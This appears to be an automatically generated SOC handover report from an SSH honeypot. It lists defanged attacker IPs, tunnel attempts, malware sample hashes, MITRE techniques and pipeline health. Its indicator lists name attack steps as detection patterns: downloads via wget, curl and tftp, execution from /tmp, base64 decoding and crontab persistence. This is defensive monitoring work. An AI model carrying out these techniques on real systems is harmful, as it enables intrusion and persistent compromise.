| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:53:04` | `cowrie.session.connect` |
| `2026-08-29 18:53:05` | `cowrie.client.version` |
| `2026-08-29 18:53:05` | `cowrie.client.kex` |
| `2026-08-29 18:53:08` | `cowrie.login.success` |
| `2026-08-29 18:53:09` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.123.116[.]93` to AbuseIPDB if not already reported
- [ ] Block `118.123.116[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-628c3f083d77

| Field | Detail |
|---|---|
| **Source IP** | `84.5.129[.]68` |
| **First Seen** | 2026-08-29 18:53 |
| **Last Seen** | 2026-08-29 18:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:53:15` | `cowrie.session.connect` |
| `2026-08-29 18:53:15` | `cowrie.client.version` |
| `2026-08-29 18:53:15` | `cowrie.client.kex` |
| `2026-08-29 18:53:16` | `cowrie.login.success` |
| `2026-08-29 18:53:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.5.129[.]68` to AbuseIPDB if not already reported
- [ ] Block `84.5.129[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074b1ce9b16f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:54 |
| **Last Seen** | 2026-08-29 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:54:21` | `cowrie.session.connect` |
| `2026-08-29 18:54:21` | `cowrie.client.version` |
| `2026-08-29 18:54:21` | `cowrie.client.kex` |
| `2026-08-29 18:54:22` | `cowrie.login.success` |
| `2026-08-29 18:54:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:54:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:54:23` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **9** | 2026-08-29 15:07 | 2026-08-29 18:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | **4** | 2026-08-29 15:18 | 2026-08-29 18:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.53.223[.]28` | **4** | 2026-08-29 16:42 | 2026-08-29 16:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.26.9[.]179` | **4** | 2026-08-29 17:18 | 2026-08-29 17:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **3** | 2026-08-29 18:10 | 2026-08-29 18:36 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `73.151.71[.]254` | **3** | 2026-08-29 16:29 | 2026-08-29 16:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-08-29 16:27 | 2026-08-29 16:45 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.107.69[.]55` | **2** | 2026-08-29 18:18 | 2026-08-29 18:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]139` | **2** | 2026-08-29 18:25 | 2026-08-29 18:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.59.108[.]247` | **2** | 2026-08-29 15:42 | 2026-08-29 16:10 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]157` | **2** | 2026-08-29 18:25 | 2026-08-29 18:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.89.76[.]249` | 1 | 2026-08-29 15:14 | 2026-08-29 15:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.13.35[.]12` | 1 | 2026-08-29 18:38 | 2026-08-29 18:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.13.35[.]21` | 1 | 2026-08-29 18:37 | 2026-08-29 18:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]128` | 1 | 2026-08-29 15:48 | 2026-08-29 15:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.36.57[.]69` | 1 | 2026-08-29 17:51 | 2026-08-29 17:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `152.32.163[.]183` | 1 | 2026-08-29 15:04 | 2026-08-29 15:04 | 14s | 0 | `T1592` | 🟢 LOW |
| `175.198.110[.]15` | 1 | 2026-08-29 16:08 | 2026-08-29 16:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `183.171.12[.]219` | 1 | 2026-08-29 18:18 | 2026-08-29 18:18 | 8s | 0 | `T1592` | 🟢 LOW |
| `2.180.36[.]41` | 1 | 2026-08-29 17:17 | 2026-08-29 17:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]217` | 1 | 2026-08-29 17:35 | 2026-08-29 17:36 | 10s | 0 | `T1592` | 🟢 LOW |
| `216.244.214[.]60` | 1 | 2026-08-29 17:05 | 2026-08-29 17:05 | 11s | 0 | `T1592` | 🟢 LOW |
| `217.208.90[.]253` | 1 | 2026-08-29 16:17 | 2026-08-29 16:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.133.214[.]135` | 1 | 2026-08-29 16:18 | 2026-08-29 16:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-08-29 15:25 | 2026-08-29 15:25 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]136` | 1 | 2026-08-29 18:25 | 2026-08-29 18:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-08-29 18:50 | 2026-08-29 18:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.108[.]159` | 1 | 2026-08-29 16:15 | 2026-08-29 16:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]24` | 1 | 2026-08-29 17:52 | 2026-08-29 17:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.239.240[.]2` | 1 | 2026-08-29 15:53 | 2026-08-29 15:53 | 2s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]242` | 1 | 2026-08-29 16:04 | 2026-08-29 16:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `65.20.134[.]110` | 1 | 2026-08-29 16:12 | 2026-08-29 16:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.255.208[.]30` | 1 | 2026-08-29 15:42 | 2026-08-29 15:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-29 16:49 | 2026-08-29 16:51 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `211.58.176[.]42` | KR | SK Broadband Co Ltd | **100** ⚠️ | 2 |
| `65.20.237[.]94` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 4 |
| `5.239.240[.]2` | IR | Telecommunication Company of Semnan | **100** ⚠️ | 6 |
| `94.26.9[.]179` | BG | NETX - NG LTD | **100** ⚠️ | 6 |
| `66.175.138[.]122` | US | C Spire Fiber | **100** ⚠️ | 2 |
| `116.59.10[.]205` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `203.193.147[.]75` | IN | Software Technology Parks of India | **100** ⚠️ | 50 |
| `202.53.94[.]242` | IN | Nettlinx Limited | **100** ⚠️ | 35 |
| `83.255.208[.]30` | SE | Tele2 Sverige AB | **100** ⚠️ | 4 |
| `70.184.183[.]12` | US | Cox Communications | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 230 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 221 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 42 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 42 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 41 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 303 cases |
| Tool 34  | Credential Extractor        | ✅ 290 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 135 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (7.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 88 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 220 priority case(s) shown individually · 34 recon entry/entries in table (11 group(s) consolidating 37 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-29T20:42:13Z_
